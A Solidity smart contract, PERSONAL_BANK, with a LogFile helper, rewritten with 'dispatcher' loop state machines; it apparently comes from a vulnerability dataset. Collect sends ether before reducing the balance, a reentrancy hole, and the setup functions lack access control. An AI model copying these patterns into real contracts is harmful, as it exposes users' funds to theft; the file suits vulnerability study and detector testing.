pragma solidity ^0.4.19;

contract PERSONAL_BANK
{
    mapping (address=>uint256) public balances;   
    uint public MinSum = 1 ether;
    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);
    bool intitalized;
    
    function SetMinSum(uint _val)
    public
    {
        uint dispatcher = 0;
        while(true) {
            if(dispatcher == 0) {
                if(intitalized) {
                    dispatcher = 1;
                } else {
                    dispatcher = 2;
                }
            } else if(dispatcher == 1) {
                revert();
            } else if(dispatcher == 2) {
                MinSum = _val;
                break;
            }
        }
    }
    
    function SetLogFile(address _log)
    public
    {
        uint dispatcher = 0;
        while(true) {
            if(dispatcher == 0) {
                if(intitalized) {
                    dispatcher = 1;
                } else {
                    dispatcher = 2;
                }
            } else if(dispatcher == 1) {
                revert();
            } else if(dispatcher == 2) {
                Log = LogFile(_log);
                break;
            }
        }
    }
    
    function Initialized()
    public
    {
        uint dispatcher = 0;
        while(true) {
            if(dispatcher == 0) {
                intitalized = true;
                break;
            }
        }
    }
    
    function Deposit()
    public
    payable
    {
        uint dispatcher = 0;
        while(true) {
            if(dispatcher == 0) {
                balances[msg.sender] += msg.value;
                dispatcher = 1;
            } else if(dispatcher == 1) {
                Log.AddMessage(msg.sender, msg.value, "Put");
                break;
            }
        }
    }
    
    function Collect(uint _am)
    public
    payable
    {
        uint dispatcher = 0;
        while(true) {
            if(dispatcher == 0) {
                if(balances[msg.sender] >= MinSum && balances[msg.sender] >= _am) {
                    dispatcher = 1;
                } else {
                    break;
                }
            } else if(dispatcher == 1) {
                if(msg.sender.call.value(_am)()) {
                    dispatcher = 2;
                } else {
                    break;
                }
            } else if(dispatcher == 2) {
                balances[msg.sender] -= _am;
                dispatcher = 3;
            } else if(dispatcher == 3) {
                Log.AddMessage(msg.sender, _am, "Collect");
                break;
            }
        }
    }
    
    function() 
    public 
    payable
    {
        Deposit();
    }
}

contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    Message[] public History;
    Message LastMsg;
    
    function AddMessage(address _adr, uint _val, string _data)
    public
    {
        uint dispatcher = 0;
        while(true) {
            if(dispatcher == 0) {
                LastMsg.Sender = _adr;
                dispatcher = 1;
            } else if(dispatcher == 1) {
                LastMsg.Time = now;
                dispatcher = 2;
            } else if(dispatcher == 2) {
                LastMsg.Val = _val;
                dispatcher = 3;
            } else if(dispatcher == 3) {
                LastMsg.Data = _data;
                dispatcher = 4;
            } else if(dispatcher == 4) {
                History.push(LastMsg);
                break;
            }
        }
    }
}